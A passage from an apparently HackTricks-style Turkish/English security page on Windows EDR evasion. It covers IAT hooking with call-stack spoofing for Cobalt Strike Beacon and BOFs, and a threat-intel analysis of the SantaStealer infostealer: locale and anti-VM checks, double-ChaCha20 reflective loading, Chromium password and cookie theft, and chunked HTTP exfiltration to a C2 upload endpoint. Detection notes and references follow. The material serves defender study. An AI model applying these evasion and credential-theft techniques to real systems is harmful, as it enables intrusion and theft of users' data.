  - Uyumluluk için bir arayüz export edin ki bir Aggressor script (veya eşdeğeri) Beacon, BOFs ve post‑ex DLL'ler için hangi API'lerin hook'lanacağını kaydedebilsin.

Why IAT hooking here
- Hook'lanan import'u kullanan herhangi bir kod için çalışır; araç kodunu değiştirmeye veya belirli API'leri proxy'lemesi için Beacon'a güvenmeye gerek yoktur.
- post‑ex DLL'leri kapsar: LoadLibrary*'ı hook'lamak modül yüklemelerini (ör. System.Management.Automation.dll, clr.dll) yakalamanızı ve aynı maskeleme/stack evasion'ı onların API çağrılarına uygulamanızı sağlar.
- CreateProcessA/W'yi sarmalayarak process‑spawning post‑ex komutlarının call‑stack–tabanlı tespitlere karşı güvenilir kullanımını geri kazandırır.

Minimal IAT hook sketch (x64 C/C++ pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Notlar
- Apply the patch after relocations/ASLR and before first use of the import. Reflective loaders like TitanLdr/AceLdr demonstrate hooking during DllMain of the loaded module.
- Wrapper'ları küçük ve PIC-safe tutun; gerçek API'yi yamalamadan önce yakaladığınız orijinal IAT değeri veya LdrGetProcedureAddress aracılığıyla çözün.
- Use RW → RX transitions for PIC and avoid leaving writable+executable pages.

Call‑stack spoofing stub
- Draugr‑style PIC stubs, sahte bir çağrı zinciri (dönüş adresleri güvenli modüllere) oluşturur ve ardından gerçek API'ye pivot yapar.
- Bu, Beacon/BOFs'tan hassas API'lere gelen kanonik yığınları bekleyen tespitleri boşa çıkarır.
- API prologundan önce beklenen frame'lerin içine inmek için stack cutting/stack stitching teknikleriyle eşleştirin.

Operasyonel entegrasyon
- Reflective loader'ı post‑ex DLL'lerin başına ekleyin, böylece DLL yüklendiğinde PIC ve hook'lar otomatik olarak initialise olur.
- Hedef API'leri kaydetmek için bir Aggressor script'i kullanın; böylece Beacon ve BOFs kod değişikliği olmadan aynı evasion yolundan şeffaf şekilde faydalanır.

Tespit/DFIR hususları
- IAT bütünlüğü: non‑image (heap/anon) adreslere çözümlenen girdiler; import işaretçilerinin periyodik doğrulanması.
- Yığın anomalileri: yüklü image'lara ait olmayan dönüş adresleri; ani non‑image PIC geçişleri; tutarsız RtlUserThreadStart soy ağacı.
- Loader telemetri: süreç içi IAT yazmaları, import thunk'larını değiştiren erken DllMain aktivitesi, yüklemede oluşturulan beklenmedik RX bölgeleri.
- Image‑load evasyon: LoadLibrary* hook'lanıyorsa, memory masking event'leriyle korele şüpheli automation/clr assembly yüklemelerini izleyin.

İlgili yapı taşları ve örnekler
- Reflective loaders that perform IAT patching during load (e.g., TitanLdr, AceLdr)
- Memory masking hooks (e.g., simplehook) and stack‑cutting PIC (stackcutting)
- PIC call‑stack spoofing stubs (e.g., Draugr)

## SantaStealer — Dosyasız Evasion ve Kimlik Bilgisi Hırsızlığı İçin Tradecraft

SantaStealer (aka BluelineStealer), modern info-stealers'ın nasıl AV bypass, anti-analysis ve credential access'i tek bir iş akışında harmanladığını gösterir.

### Klavye düzeni kontrolü & sandbox gecikmesi

- Bir config flag'i (`anti_cis`) `GetKeyboardLayoutList` aracılığıyla yüklü klavye düzenlerini enumerate eder. Eğer Kiril bir düzen bulunursa, örnek boş bir `CIS` marker bırakır ve stealers'ı çalıştırmadan önce sonlanır; böylece hariç tutulan yerellerde asla detonasyon olmazken bir hunting artefaktı bırakır.
```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
if (lang == LANG_RUSSIAN) {
CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
ExitProcess(0);
}
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```
### Katmanlı `check_antivm` mantığı

- Variant A işlem listesini tarar, her adı özel bir rolling checksum ile hashler ve gömülü debuggerlar/sandboxlar için blocklistlerle karşılaştırır; checksum işlemini bilgisayar adı üzerinde tekrarlar ve `C:\analysis` gibi çalışma dizinlerini kontrol eder.
- Variant B sistem özelliklerini inceler (minimum işlem sayısı, son uptime), VirtualBox eklentilerini tespit etmek için `OpenServiceA("VBoxGuest")` çağrısı yapar ve single-stepping tespiti için sleep etrafında timing kontrolleri gerçekleştirir. Herhangi bir tespit, modüller başlatılmadan önce işlemi sonlandırır.

### Fileless helper + double ChaCha20 reflective loading

- Birincil DLL/EXE, Chromium credential helper'ı gömülü olarak barındırır; bu helper ya diske bırakılır ya da manuel olarak in-memory mapped edilir; fileless modu import/relocation'ları kendisi çözer, böylece helper artefaktı yazılmaz.
- Bu helper, ChaCha20 ile iki kez şifrelenmiş ikinci aşama bir DLL saklar (iki 32-byte anahtar + 12-byte nonce). Her iki geçişten sonra blob'u reflectively load eder (no `LoadLibrary`) ve [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)'dan türetilmiş `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` export'larını çağırır.
- ChromElevator rutinleri, canlı bir Chromium tarayıcısına inject etmek için direct-syscall reflective process hollowing kullanır, AppBound Encryption anahtarlarını devralır ve ABE hardening'e rağmen SQLite veritabanlarından şifreleri/cookie'leri/kredi kartlarını doğrudan decrypt eder.

### Modular in-memory collection & chunked HTTP exfil

- `create_memory_based_log`, global `memory_generators` function-pointer tablosunda iterasyon yapar ve her etkin modül için (Telegram, Discord, Steam, screenshots, documents, browser extensions vb.) bir thread spawn eder. Her thread sonuçları paylaşılan buffer'lara yazar ve ~45s'lik join penceresinden sonra dosya sayısını raporlar.
- İşlem tamamlandığında, her şey statically linked `miniz` kütüphanesi ile `%TEMP%\\Log.zip` olarak ziplenir. `ThreadPayload1` sonra 15s uyur ve arşivi HTTP POST ile `http://<C2>:6767/upload` adresine 10 MB parçalar halinde stream eder, tarayıcı `multipart/form-data` boundary'si (`----WebKitFormBoundary***`) taklidi yapar. Her parça `User-Agent: upload`, `auth: <build_id>`, opsiyonel `w: <campaign_tag>` ekler ve son parça `complete: true` ekleyerek C2'nin yeniden birleştirmenin tamamlandığını bilmesini sağlar.

## References

- [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [Elastic – Call stacks, no more free passes for malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)

- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [Zero Salarium – Break The Protective Shell Of Windows Defender With The Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)

- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [Rapid7 – SantaStealer is Coming to Town: A New, Ambitious Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [ChromElevator – Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)

{{#include ../banners/hacktricks-training.md}}
